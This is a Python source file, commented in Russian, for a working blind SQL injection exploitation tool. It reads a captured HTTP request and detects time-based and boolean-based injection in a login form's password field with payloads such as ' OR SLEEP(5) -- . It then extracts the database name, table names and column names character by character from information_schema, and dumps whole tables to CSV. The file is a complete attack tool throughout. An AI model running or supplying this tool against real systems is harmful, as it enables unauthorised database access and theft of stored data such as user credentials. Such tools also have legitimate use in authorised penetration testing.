import argparse
import csv
import os
import requests
import time
from datetime import datetime
from urllib.parse import unquote

class SqlExploit:
    def __init__(self, config):
        self.config = config
        self.injection_marker = "$injection$"
        self.injection_type = None
        self.method, self.url, self.headers, self.body_template = self._parse_request_file()
        self.timeout = 10
        self.verify_ssl = False
        self.db_name = None
        self.current_table = None

    def _parse_request_file(self):
        """Парсинг файла с HTTP-запросом"""
        try:
            if not os.path.exists(self.config['request_file']):
                raise FileNotFoundError(f"Файл {self.config['request_file']} не найден")

            with open(self.config['request_file'], 'r', encoding='utf-8') as f:
                content = f.read()

            lines = [line.rstrip('\r') for line in content.split('\n')]
            
            try:
                parts = lines[0].split()
                method = parts[0]
                path = parts[1]
            except IndexError:
                raise ValueError("Некорректная стартовая строка HTTP-запроса")

            host_header = next((line for line in lines if line.lower().startswith('host:')), None)
            if not host_header:
                raise ValueError("Заголовок Host отсутствует")
            
            host = host_header.split(': ', 1)[1].strip()

            if path.startswith(('http://', 'https://')):
                url = path
            else:
                protocol = 'https' if ':443' in host else 'http'
                url = f"{protocol}://{host}{path}"

            headers = {}
            body_lines = []
            in_body = False
            
            for line in lines[1:]:
                if line.lower().startswith('host:'):
                    continue
                
                if not line.strip():
                    in_body = True
                    continue
                    
                if in_body:
                    body_lines.append(line)
                else:
                    try:
                        key, val = line.split(': ', 1)
                        headers[key] = val
                    except ValueError:
                        continue

            body_str = '\n'.join(body_lines)
            
            if self.injection_marker not in body_str:
                print("[DEBUG] Тело запроса:", repr(body_str))
                raise ValueError(f"Метка {self.injection_marker} не найдена")

            return method, url, headers, body_str

        except Exception as e:
            raise RuntimeError(f"Ошибка парсинга файла: {str(e)}")

    def _prepare_request(self, payload):
        """Подготовка запроса с payload"""
        final_body = self.body_template.replace(self.injection_marker, payload)
        return {
            'method': self.method,
            'url': self.url,
            'headers': self.headers,
            'data': final_body,
            'proxies': self.config.get('proxies'),
            'timeout': self.timeout,
            'verify': self.verify_ssl
        }

    def send_request(self, payload):
        """Отправка запроса"""
        try:
            req_params = self._prepare_request(payload)
            response = requests.request(**req_params)
            time.sleep(self.config['delay'])
            return response
        except Exception as e:
            print(f"[!] Ошибка запроса: {str(e)}")
            return None

    def initial_checks(self):
        """Проверка наличия уязвимости"""
        if self.config.get('skip_check'):
            return True
            
        print("\n[=== Проверка уязвимостей ===]")
        
        # Time-based check
        test_payload = "' OR SLEEP(5) -- "
        start_time = time.time()
        self.send_request(test_payload)
        elapsed = time.time() - start_time
        
        if elapsed >= 5:
            print("[+] Обнаружена time-based SQLi")
            self.injection_type = "time"
            return True
        
        # Boolean-based check
        true_payload = "' OR 1=1 -- "
        false_payload = "' OR 1=0 -- "
        
        true_response = self.send_request(true_payload)
        false_response = self.send_request(false_payload)
        
        if true_response and false_response:
            if (self.config['true_indicator'] in true_response.text and 
                self.config['true_indicator'] not in false_response.text):
                print("[+] Обнаружена boolean-based SQLi")
                self.injection_type = "boolean"
                return True
        
        print("[-] Уязвимости не обнаружены")
        return False

    def binary_search(self, query, position):
        """Бинарный поиск символа"""
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTRING(({query}),{position},1)) <= {mid}"
            if self.check_condition(condition):
                high = mid - 1
            else:
                low = mid + 1
        return chr(low)

    def extract_data(self, query, max_length=100):
        """Извлечение данных с автоматическим определением длины"""
        length = self.get_length(f"SELECT LENGTH(({query}))")
        if not length or length == 0:
            return ""
        
        print(f"[*] Извлекаем {length} символов...")
        return self._extract_fixed_length(query, length)

    def _extract_fixed_length(self, query, length):
        """Извлечение данных известной длины"""
        result = ""
        for pos in range(1, length + 1):
            char = self.binary_search(query, pos)
            result += char
            print(f"[+] Позиция {pos}/{length}: {char} → {result}")
        return result

    def check_condition(self, condition):
        """Проверка SQL-условия"""
        payload = f"111' OR ({condition}) -- "
        final_payload = self.config['base_payload'].replace(self.injection_marker, payload)
        response = self.send_request(final_payload)
        return response and (self.config['true_indicator'] in response.text)

    def get_length(self, query):
        """Определение длины данных с обработкой NULL"""
        for length in range(0, 1024):
            if self.check_condition(f"COALESCE(({query}),0) = {length}"):
                return length
        return 0

    def get_database(self):
        """Получение имени БД"""
        print("\n[=== Извлечение имени БД ===]")
        return self.extract_data("SELECT DATABASE()")

    def get_tables(self, db_name):
        """Получение списка таблиц"""
        print(f"\n[=== Извлечение таблиц БД {db_name} ===]")
        query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'"
        tables = self.extract_data(query)
        return tables.split(',') if tables else []

    def get_columns(self, table_name, db_name=None):
        """Получение списка колонок"""
        db_clause = f"'{db_name}'" if db_name else "DATABASE()"
        print(f"\n[=== Извлечение колонок таблицы {table_name} ===]")
        query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema={db_clause}"
        columns = self.extract_data(query)
        return columns.split(',') if columns else []

    def dump_table(self, table_name, columns, db_name=None):
        """Дамп таблицы с сохранением в CSV и выводом в терминал"""
        print(f"\n[=== Дамп таблицы {table_name} ===]")
        db_clause = f"`{db_name}`." if db_name else ""
        
        count_query = f"SELECT COUNT(*) FROM {db_clause}`{table_name}`"
        total_rows = self.get_length(count_query)
        print(f"[+] Всего строк: {total_rows}")
        
        results = []
        for row_num in range(total_rows):
            print(f"\n[=== Строка {row_num+1}/{total_rows} ===]")
            row_data = []
            
            for col in columns:
                length_query = f"SELECT LENGTH(`{col}`) FROM {db_clause}`{table_name}` LIMIT {row_num},1"
                length = self.get_length(length_query)
                
                if length == 0:
                    row_data.append("NULL")
                    continue
                
                value_query = f"SELECT `{col}` FROM {db_clause}`{table_name}` LIMIT {row_num},1"
                value = self.extract_data(value_query, length)
                row_data.append(value)
            
            results.append(row_data)
            print(f"[+] Данные: {row_data}")

        # Сохранение в CSV
        self.save_to_csv(table_name, columns, results)
        
        # Вывод всех данных в терминал
        print("\n[+] Итоговые извлеченные данные:")
        print("\n[ Заголовки ]")
        print(" | ".join(columns))
        print("-" * (sum(len(col) for col in columns) + 3 * len(columns)))
        
        for i, row in enumerate(results, 1):
            print(f"[ Строка {i} ]")
            print(" | ".join(str(value) for value in row))
            print("-" * (sum(len(str(value)) for value in row) + 3 * len(row)))
        
        return results

    def save_to_csv(self, table_name, columns, data):
        """Сохранение данных в CSV файл"""
        if self.config.get('simple_names'):
            filename = f"{table_name}.csv"
        else:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{table_name}_{timestamp}.csv"
        
        output_dir = self.config['output_dir']
        filepath = os.path.join(output_dir, filename)
        
        os.makedirs(output_dir, exist_ok=True)

        try:
            with open(filepath, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(columns)
                writer.writerows(data)
            print(f"\n[+] Данные сохранены в: {os.path.abspath(filepath)}")
        except Exception as e:
            print(f"[!] Ошибка при сохранении в CSV: {str(e)}")

    def interactive_mode(self):
        """Интерактивный режим работы"""
        print("\n[=== Интерактивный режим ===]")
        
        if not self.db_name:
            self.db_name = self.get_database()
            print(f"\n[+] Имя базы данных: {self.db_name}")
        
        tables = self.get_tables(self.db_name)
        print(f"\n[+] Таблицы в БД {self.db_name}: {', '.join(tables)}")
        
        table = input("\n[?] Введите имя таблицы для исследования: ").strip()
        while table not in tables:
            print("[-] Таблица не найдена")
            table = input("[?] Введите корректное имя таблицы: ").strip()
        
        columns = self.get_columns(table, self.db_name)
        print(f"\n[+] Колонки таблицы {table}: {', '.join(columns)}")
        
        if input("[?] Сделать дамп таблицы? [Y/n] ").lower() in ('y', ''):
            self.dump_table(table, columns, self.db_name)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Автоматизированный инструмент для эксплуатации слепых SQLi")
    parser.add_argument('-r', '--request', required=True, help='Файл с HTTP-запросом')
    parser.add_argument('-i', '--indicator', required=True, help='Индикатор успешного условия')
    
    group = parser.add_argument_group('Цели')
    group.add_argument('--database', action='store_true', help='Извлечь имя БД')
    group.add_argument('--tables', metavar='DB_NAME', help='Извлечь таблицы')
    group.add_argument('--columns', metavar='TABLE_NAME', help='Извлечь колонки')
    group.add_argument('--dump-table', metavar='TABLE_NAME', help='Дамп таблицы')
    
    parser.add_argument('--db-name', help='Имя БД')
    parser.add_argument('--delay', type=float, default=0.5, help='Задержка между запросами')
    parser.add_argument('--proxy', help='HTTP прокси')
    parser.add_argument('--non-interactive', action='store_true', help='Отключить интерактивный режим')
    parser.add_argument('-o', '--output', default='.', help='Директория для сохранения дампов')
    parser.add_argument('--simple-names', action='store_true', help='Использовать простые имена файлов')
    parser.add_argument('--skip-check', action='store_true', help='Пропустить проверку уязвимости')

    args = parser.parse_args()

    config = {
        'request_file': args.request,
        'true_indicator': args.indicator,
        'delay': args.delay,
        'proxies': {'http': args.proxy, 'https': args.proxy} if args.proxy else None,
        'base_payload': "login=111&passwd=$injection$&submit=enter",
        'output_dir': args.output,
        'simple_names': args.simple_names,
        'skip_check': args.skip_check
    }

    try:
        exploiter = SqlExploit(config)
        
        if not config['skip_check'] and not exploiter.initial_checks():
            exit(1)
        
        if not any([args.database, args.tables, args.columns, args.dump_table]):
            if not args.non_interactive:
                exploiter.interactive_mode()
            else:
                print("[!] Укажите цель или используйте интерактивный режим")
        else:
            if args.database:
                db_name = exploiter.get_database()
                print(f"\n[+] Имя базы данных: {db_name}")
            
            if args.tables:
                tables = exploiter.get_tables(args.tables or exploiter.db_name)
                print(f"\n[+] Таблицы: {', '.join(tables)}")
            
            if args.columns:
                columns = exploiter.get_columns(args.columns, args.db_name)
                print(f"\n[+] Колонки: {', '.join(columns)}")
            
            if args.dump_table:
                columns = exploiter.get_columns(args.dump_table, args.db_name)
                data = exploiter.dump_table(args.dump_table, columns, args.db_name)

    except Exception as e:
        print(f"[!] Критическая ошибка: {str(e)}")
        exit(1)
